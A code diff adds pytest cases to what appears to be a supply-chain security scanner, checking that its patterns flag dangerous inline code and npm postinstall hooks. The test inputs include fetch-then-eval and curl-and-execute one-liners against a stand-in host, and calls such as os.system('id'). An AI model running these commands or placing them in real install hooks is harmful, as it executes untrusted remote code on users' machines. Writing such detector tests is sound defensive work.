@@ -403,6 +403,20 @@ class TestUnicodeData:
         assert [f for f in _scan(f"T = '{text}'\n") if f.category == "hidden_unicode"]
 
 
+class TestInlineCodeDangerRegex:
+    @pytest.mark.parametrize("code", [
+        "require('evil')", "fetch('https://x.example')", "Function('return 1')()",
+        "requests.get(u)", "os.system('id')", "exec(x)",
+    ])
+    def test_tokens_ending_in_punctuation_match(self, code):
+        from src.scanner.patterns import INLINE_CODE_DANGER_RE
+        assert INLINE_CODE_DANGER_RE.search(code), code
+
+    def test_constant_node_e_require_spawn_is_a_defect(self):
+        d = _exec_defects(_scan("spawn('node', ['-e', \"require('evil')\"]);\n", "x.js"))
+        assert d and d[0].severity == "high"
+
+
 class TestInstallHookInlineNode:
     def _hook(self, cmd: str):
         return _scan_install_hooks(json.dumps({"scripts": {"postinstall": cmd}}),
@@ -413,6 +427,8 @@ class TestInstallHookInlineNode:
         assert [x.severity for x in f] == ["medium"]
 
     @pytest.mark.parametrize("cmd", [
+        "node -e \"require('evil')\"",
+        "node -e \"console.log(require('os').userInfo())\"",
         "node -e \"require('child_process').exec('id')\"",
         "node -e \"fetch('https://x.example').then(r => r.text()).then(eval)\"",
         'node -e "$(curl -s https://x.example/p)"',
